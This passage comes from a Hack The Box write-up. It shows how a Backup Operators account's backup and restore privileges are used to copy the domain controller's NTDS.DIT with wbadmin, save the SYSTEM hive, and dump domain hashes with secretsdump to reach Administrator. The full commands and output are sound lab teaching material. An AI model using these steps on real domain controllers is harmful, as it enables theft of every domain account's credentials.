And `user.txt` is at `svc_backup`'s desktop.

{% include image.html image_alt="40396855.png" image_src="/87ca8c32-76af-4d5c-b699-581888d0c338/40396855.png" %}

## Privilege Escalation

During enumeration of `svc_backup`'s account, I noted that `svc_backup` is in the **Backup Operators** group and has both `SeBackupPrivilege` and `SeRestorePrivilege`.

{% include image.html image_alt="7841cdeb.png" image_src="/87ca8c32-76af-4d5c-b699-581888d0c338/7841cdeb.png" %}

### Copying `NTDS.DIT` and `SYSTEM` hive

Armed with that information, we can utilize `wbadmin.exe` to backup `NTDS.DIT` like so.

```
PS> wbadmin start backup -quiet -backuptarget:\\dc01\c$\users\svc_backup\temp -include:c:\windows\ntds
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Summary of the backup operation:
------------------

The backup operation successfully completed.
The backup of volume (C:) completed successfully.
Log of files successfully backed up:
C:\Windows\Logs\WindowsServerBackup\Backup-11-06-2020_16-52-44.log
```

Next we retrieve the backup.

```
PS> wbadmin get versions
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Backup time: 6/11/2020 9:52 AM
Backup location: Network Share labeled \\dc01\c$\users\svc_backup\temp
Version identifier: 06/11/2020-16:52
Can recover: Volume(s), File(s)
```

Finally, we restore it to a target folder sans the ACL.

```
PS> wbadmin start recovery -quiet -version:06/11/2020-16:52 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\users\svc_backup\temp -notrestoreacl
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Retrieving volume information...
You have chosen to recover the file(s) c:\windows\ntds\ntds.dit from the
backup created on 6/11/2020 9:52 AM to c:\users\svc_backup\temp.
Preparing to recover files...

Successfully recovered c:\windows\ntds\ntds.dit to c:\users\svc_backup\temp\.
The recovery operation completed.
Summary of the recovery operation:
--------------------

Recovery of c:\windows\ntds\ntds.dit to c:\users\svc_backup\temp\ successfully completed.
Total bytes recovered: 18.00 MB
Total files recovered: 1
Total files failed: 0

Log of files successfully recovered:
C:\Windows\Logs\WindowsServerBackup\FileRestore-11-06-2020_16-58-30.log
```

Next up, we save a copy of the SYSTEM hive like so.

```
PS> REG SAVE HKLM\SYSTEM C:\Users\svc_backup\temp\system
```

I'll leave it as an exercise how to transfer these files over to your analysis machine.

### Dumping secrets from `NTDS.DIT` and `SYSTEM`

We can make use of Impacket's `secretsdump.py` to extract the NT hashes of all the domain accounts like so.

{% include image.html image_alt="1ecad05f.png" image_src="/87ca8c32-76af-4d5c-b699-581888d0c338/1ecad05f.png" %}

We are interested in the NT hash of Administrator. Armed with it, we can finally get an interactive shell similar to what we did with `svc_backup`. And with that, the `root` flag.

{% include image.html image_alt="b8847813.png" image_src="/87ca8c32-76af-4d5c-b699-581888d0c338/b8847813.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/255
[2]: https://www.hackthebox.eu/home/users/profile/6259
[3]: https://www.hackthebox.eu/
